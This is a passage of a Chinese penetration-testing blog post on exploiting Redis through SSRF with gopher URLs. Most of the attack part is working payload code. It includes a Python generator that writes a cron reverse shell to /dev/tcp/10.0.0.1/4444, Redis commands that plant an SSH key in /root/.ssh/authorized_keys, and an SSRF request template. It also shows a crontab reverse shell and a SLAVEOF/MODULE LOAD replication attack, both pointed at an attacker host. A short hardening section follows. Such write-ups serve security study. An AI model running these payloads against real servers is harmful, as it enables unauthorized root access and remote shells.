<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 生成公钥</span></span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line">(公钥保存到文件：id_rsa.pub)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 构造Redis命令</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;FLUSHALL\nCONFIG SET dir /root/.ssh\nCONFIG SET dbfilename authorized_keys\nSET x \&quot;\\n\\n<span class="subst">$(cat id_rsa.pub)</span>\\n\\n\&quot;\nSAVE\n&quot;</span> &gt; payload.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 转换为Redis协议格式（使用脚本或工具，如redis-cli --pipe）</span></span><br><span class="line"><span class="comment"># 或手动构造：</span></span><br><span class="line"><span class="comment"># 每行命令格式：*&lt;参数个数&gt;\r\n$&lt;长度&gt;\r\n&lt;命令&gt;\r\n...</span></span><br></pre></td></tr></table></figure>
<p>将生成的二进制协议数据通过Gopher发送。</p>
<h4 id="2-4-redis命令格式"><a href="#2-4-redis命令格式" class="headerlink" title="2.4 redis命令格式"></a>2.4 redis命令格式</h4><ul>
<li>redis的命令接受是通过TCP请求，发送二进制数据实现的命令注入。因此发送的二进制数据需要符合RESP格式。</li>
<li>具体格式如下：<ul>
<li>*1 ；*号表示当前命令的开头，*后的数字表示该行命令的字符串个数，即该行命令为FLUSHALL，只有一个字符串。而*4表示该行命令有4个字符串，即config set dir &#x2F;var&#x2F;spool&#x2F;cron。</li>
<li>$8; 而表示后面后一串命令字符串，且字符长度为8，即FLUSHALL，$6表示6个字符的命令关键字为CONFIG</li>
<li>同时每个字符串，包括标识符*1或者$8都使用CR LF进行分割，即\r\n，是不可见字符，\r\n只是转义的表示，不可直接将\r\n进行url编码获得CR LF，而是直接将字符编码为%0D%0A即可。</li>
</ul>
</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250323234159460.png?x-oss-process=style/img-to-webp" alt="image-20250323234159460"></p>
<ul>
<li>知道了具体格式那么我们就可以手撸payload了，例如只传输一个SAVE指令。</li>
</ul>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gopher://_*1%0D%0A$4%0D%0ASAVE%0D%0A</span><br><span class="line">再将*和$进行url编码</span><br><span class="line">gopher://_%2A1%0D%0A%244%0D%0ASAVE%0D%0A</span><br><span class="line">其中_是gopher协议的发送二进制数据的标识起始位。</span><br></pre></td></tr></table></figure>

<ul>
<li>或者利用python代码生成payload url</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> shlex</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redis_protocol</span>(<span class="params">cmd</span>):</span><br><span class="line">    parts = shlex.split(cmd)</span><br><span class="line">    protocol = <span class="string">f&quot;*<span class="subst">&#123;<span class="built_in">len</span>(parts)&#125;</span>\r\n&quot;</span>  <span class="comment"># 使用\r\n作为分隔符</span></span><br><span class="line">    <span class="keyword">for</span> part <span class="keyword">in</span> parts:</span><br><span class="line">        <span class="comment"># 处理特殊字符（保留原始\n）</span></span><br><span class="line">        part = part.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;\n&quot;</span>)  <span class="comment"># 不转义，直接保留</span></span><br><span class="line">        protocol += <span class="string">f&quot;$<span class="subst">&#123;<span class="built_in">len</span>(part)&#125;</span>\r\n<span class="subst">&#123;part&#125;</span>\r\n&quot;</span></span><br><span class="line">    <span class="keyword">return</span> protocol</span><br><span class="line"></span><br><span class="line">commands = [</span><br><span class="line">    <span class="string">&quot;FLUSHALL&quot;</span>,</span><br><span class="line">    <span class="string">&quot;CONFIG SET dir /var/spool/cron&quot;</span>,</span><br><span class="line">    <span class="string">&quot;CONFIG SET dbfilename root&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;SET x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1\n&quot;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;SAVE&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> cmd <span class="keyword">in</span> commands:</span><br><span class="line">    payload += redis_protocol(cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换为字节并URL编码</span></span><br><span class="line">raw_payload = payload.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">gopher_payload = <span class="string">f&quot;gopher://127.0.0.1:6379/_<span class="subst">&#123;urllib.parse.quote(raw_payload)&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;修正后的Gopher Payload:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(gopher_payload)</span><br></pre></td></tr></table></figure>



<h4 id="2-5-通过SSRF发送Payload"><a href="#2-5-通过SSRF发送Payload" class="headerlink" title="2.5 通过SSRF发送Payload"></a><strong>2.5 通过SSRF发送Payload</strong></h4><ul>
<li><strong>Payload示例</strong>：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://192.168.1.10:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%243%0D%0Adir%0D%0A%2411%0D%0A/root/.ssh%0D%0A...</span><br></pre></td></tr></table></figure>
<ul>
<li>URL编码后的Gopher链接通过SSRF触发：<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/fetch?url=gopher://192.168.1.10:6379/_&lt;encoded_payload&gt;</span> <span class="meta">HTTP/1.1</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<hr>
<h3 id="3-获取权限"><a href="#3-获取权限" class="headerlink" title="3. 获取权限"></a><strong>3. 获取权限</strong></h3><h4 id="3-1-SSH登录"><a href="#3-1-SSH登录" class="headerlink" title="3.1 SSH登录"></a><strong>3.1 SSH登录</strong></h4><p>若写入公钥成功，直接通过SSH连接：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa root@192.168.1.10</span><br></pre></td></tr></table></figure>

<h4 id="3-2-其他利用方式"><a href="#3-2-其他利用方式" class="headerlink" title="3.2 其他利用方式"></a><strong>3.2 其他利用方式</strong></h4><ul>
<li><strong>写入Crontab定时任务</strong>：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CONFIG SET dir /var/spool/cron</span><br><span class="line">CONFIG SET dbfilename root</span><br><span class="line">SET x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/attacker-ip/port 0&gt;&amp;1\n&quot;</span><br><span class="line">SAVE</span><br></pre></td></tr></table></figure></li>
<li><strong>主从复制攻击</strong>（Redis 4.x&#x2F;5.x）：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SLAVEOF attacker-ip 6379</span><br><span class="line">MODULE LOAD /path/to/exp.so</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h3 id="4-横向移动"><a href="#4-横向移动" class="headerlink" title="4. 横向移动"></a><strong>4. 横向移动</strong></h3><ul>
<li><strong>信息收集</strong>：获取内网拓扑、其他服务凭证。</li>
<li><strong>利用Redis作为跳板</strong>：通过已控制的Redis服务器进一步渗透内网。</li>
</ul>
<hr>
<h3 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a><strong>防御建议</strong></h3><ol>
<li><strong>修复SSRF</strong>：<ul>
<li>禁止非预期的协议（如<code>gopher</code>、<code>dict</code>）。</li>
<li>校验请求目标是否为合法地址。</li>
</ul>
</li>
<li><strong>加固Redis</strong>：<ul>
<li>绑定IP为<code>127.0.0.1</code>。</li>
<li>设置强密码认证。</li>
<li>启用<code>protected-mode</code>。</li>
</ul>
</li>
<li><strong>网络隔离</strong>：限制内网服务的访问权限。</li>
</ol>
<hr>
<p><strong>注意事项</strong>：</p>
<ul>
<li>Gopher协议可能被现代Web框架禁用。</li>
<li>Redis的目录权限需允许写入（如<code>/root/.ssh</code>需存在）。</li>
<li>不同操作系统和Redis版本可能影响利用成功率。</li>
</ul>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/avtor.png?x-oss-process=style/img-to-webp" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/avtor.png?x-oss-process=style/img-to-webp" title="头像" alt="头像"></a><div class="post-copyright__author_name">Takake</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="https://blog.takake.com/posts/56723/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('https://blog.takake.com/posts/56723/')">SSRF-Redis专题</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="赞赏作者"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>打赏作者</div><div class="reward-main"><div class="reward-all"><span class="reward-title">感谢你赐予我前进的力量</span><ul class="reward-group"><li class="reward-item"><a href="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/red_cross.png?x-oss-process=style/img-to-webp" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/red_cross.png?x-oss-process=style/img-to-webp" alt="红十字会"/></a><div class="post-qr-code-desc">红十字会</div></li><li class="reward-item"><a href="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/logo.png?x-oss-process=style/img-to-webp" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/logo.png?x-oss-process=style/img-to-webp" alt="LOGO"/></a><div class="post-qr-code-desc">LOGO</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">赞赏者名单</div><div class="reward-dec">因为你们的支持让我意识到写文章的价值🙏</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display: none"></div></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="https://blog.takake.com/posts/56723/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=SSRF-Redis专题&amp;url=https://blog.takake.com/posts/56723/&amp;pic=/img/default_cover.jpg" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://blog.takake.com" target="_blank">高木のBlog</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>漏洞复现<span class="tagsPageCount">22</span></a><a class="post-meta__box__tags" href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>中间件<span class="tagsPageCount">15</span></a><a class="post-meta__box__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>网络安全<span class="tagsPageCount">10</span></a><a class="post-meta__box__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>渗透测试<span class="tagsPageCount">22</span></a><a class="post-meta__box__tags" href="/tags/RCE/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>RCE<span class="tagsPageCount">18</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="/img/default_cover.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/32163/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/t01d2db9ae92fa8184f.png?x-oss-process=style/img-to-webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Fastjson安全漏洞分析</div></div></a></div><div class="next-post pull-right"><a href="/posts/16557/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/default_cover.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">常见未授权访问漏洞利用</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/posts/62533/" title="Confluence-CVE-2022-26134"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/what%20is%20CVE.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-02-11</div><div class="title">Confluence-CVE-2022-26134</div></div></a></div><div><a href="/posts/6124/" title="ColdFusion-CVE-2017-3066"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/what%20is%20CVE.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-02-11</div><div class="title">ColdFusion-CVE-2017-3066</div></div></a></div><div><a href="/posts/19496/" title="GitLab-CVE-2021-22205"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/what%20is%20CVE.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-02-14</div><div class="title">GitLab-CVE-2021-22205</div></div></a></div><div><a href="/posts/25650/" title="Spring Cloud-CVE-2022-22947"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/what%20is%20CVE.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-02-11</div><div class="title">Spring Cloud-CVE-2022-22947</div></div></a></div><div><a href="/posts/42518/" title="Kibana-CVE-2019-7609"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/what%20is%20CVE.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-02-11</div><div class="title">Kibana-CVE-2019-7609</div></div></a></div><div><a href="/posts/23196/" title="Nacos安全漏洞全系列复现"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/TB1qqkLKxnaK1RjSZFBXXcW7VXa-1830-982.png?x-oss-process=style/img-to-webp" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-07-18</div><div class="title">Nacos安全漏洞全系列复现</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div><div class="comment-tips" id="comment-tips"><span>✅ 你无需删除空行，直接评论以获取最佳展示效果</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/avtor.png?x-oss-process=style/img-to-webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://emotion.acs.pw/emotion/Heo-100/%E6%BB%91%E7%A8%BD.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">网络安全、开发、人工智能</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/"><h1 class="author-info__name">Takake</h1><div class="author-info__desc"></div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/takakie" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/3494356843497618" target="_blank" title="BiliBili"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bullhorn anzhiyu-shake"></i><span>公告</span></div><div class="announcement_content">防疫指南：菊花上插葱，新冠去无踪✌️</div></div><div class="card-widget anzhiyu-right-widget" id="card-wechat" onclick="null"><div id="flip-wrapper"><div id="flip-content"><div class="face" style="background: url(https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/63c02edf44033.png) center center / 100% no-repeat"></div><div class="back face" style="background: url(https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/645fa415e869402.png) center center / 100% no-repeat"></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.</span> <span class="toc-text">SSRF漏洞详解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81SSRF-%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5"><span class="toc-number">1.1.</span> <span class="toc-text">一、SSRF 漏洞基础概念</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81SSRF-%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text">二、SSRF 攻击原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81SSRF-%E7%9A%84%E5%8D%B1%E5%AE%B3%E5%9C%BA%E6%99%AF"><span class="toc-number">1.3.</span> <span class="toc-text">三、SSRF 的危害场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81SSRF-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.4.</span> <span class="toc-text">四、SSRF 漏洞利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%9F%BA%E7%A1%80%E5%88%A9%E7%94%A8%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.4.1.</span> <span class="toc-text">1. 基础利用示例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E9%AB%98%E7%BA%A7%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7ByPass"><span class="toc-number">1.4.2.</span> <span class="toc-text">2. 高级利用技巧ByPass</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E8%BF%9B%E5%88%B6%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">1.进制编码绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E6%9C%AC%E5%9C%B0%E5%9B%9E%E7%8E%AF%E7%AE%80%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">2.本地回环简写绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E5%9F%9F%E5%90%8D%E6%B3%9B%E8%A7%A3%E6%9E%90%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.2.3.</span> <span class="toc-text">3.域名泛解析绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E5%88%A9%E7%94%A8%E5%8F%A5%E5%8F%B7%E4%BB%A3%E6%9B%BF%E2%80%9C-%E2%80%9D%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.2.4.</span> <span class="toc-text">4.利用句号代替“.”绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-%E7%9F%AD%E9%93%BE%E6%8E%A5%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.2.5.</span> <span class="toc-text">5.短链接绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#6-%E6%B3%A8%E9%87%8A%E7%BB%95%E8%BF%87-%E8%B7%AF%E7%94%B1%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.2.6.</span> <span class="toc-text">6.注释绕过&#x2F;路由绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#7-%E5%88%A9%E7%94%A8%E5%B0%81%E9%97%AD%E7%9A%84%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.2.7.</span> <span class="toc-text">7.利用封闭的字母数字绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#8-%E5%88%A9%E7%94%A8ipv6%E8%A7%A3%E6%9E%90%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.2.8.</span> <span class="toc-text">8.[::]利用ipv6解析绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#9-CRLF%E7%BC%96%E7%A0%81%E8%BD%AC%E6%8D%A2%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.2.9.</span> <span class="toc-text">9.CRLF编码转换绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#10-%E5%9F%9F%E5%90%8D%E6%8C%87%E5%90%91%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.2.10.</span> <span class="toc-text">10.域名指向绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#11-%E9%87%8D%E5%AE%9A%E5%90%91%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.2.11.</span> <span class="toc-text">11.重定向绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4"><span class="toc-number">1.5.</span> <span class="toc-text">五、攻击步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%AD%E3%80%81SSRF-%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88"><span class="toc-number">1.6.</span> <span class="toc-text">六、SSRF 漏洞防御方案</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E8%BE%93%E5%85%A5%E6%A0%A1%E9%AA%8C%E4%B8%8E%E8%BF%87%E6%BB%A4"><span class="toc-number">1.6.1.</span> <span class="toc-text">1. 输入校验与过滤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E7%BD%91%E7%BB%9C%E9%9A%94%E7%A6%BB%E4%B8%8E%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6"><span class="toc-number">1.6.2.</span> 